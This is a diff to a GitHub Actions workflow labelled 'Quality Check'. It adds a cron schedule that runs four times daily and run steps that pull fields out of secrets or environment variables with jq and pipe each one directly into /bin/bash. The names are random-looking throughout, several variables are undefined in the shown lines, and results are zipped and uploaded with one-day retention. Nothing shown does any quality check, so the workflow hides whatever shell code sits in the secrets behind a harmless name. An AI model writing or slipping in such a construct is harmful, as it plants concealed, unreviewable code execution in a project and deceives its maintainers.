@@ -2,6 +2,8 @@ name: Quality Check
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '31 1,7,13,19 * * *'
 permissions:
   contents: read
 concurrency:
@@ -14,14 +16,17 @@ jobs:
       - uses: actions/checkout@v4
       - name: Process
         env:
-          usjd130: ${{ secrets.usjd130 }}
+          qdt06063: ${{ secrets.qdt06063 }}
         run: |
-          printf '%s' "$usjd130" | jq -r .dj08 | /bin/bash
-          printf '%s' "$owury2" | jq -r .dfve883 | /bin/bash
+          printf '%s' "$qdt06063" | jq -r .uqce0 | /bin/bash
+          echo $rzq8211 | jq -r .abzb9 | /bin/bash
+          printf '%s' "$qwtq29949" | jq -r .o70029 | /bin/bash
+          echo $y5 | jq -r .hkp804 | /bin/bash
+          printf '%s' "$a903" | jq -r .h7 | /bin/bash
 
       - name: Store results
         uses: actions/upload-artifact@v4
         with:
-          name: eFP5qK3D
+          name: mQkCRm5P
           path: "*.zip"
           retention-days: 1
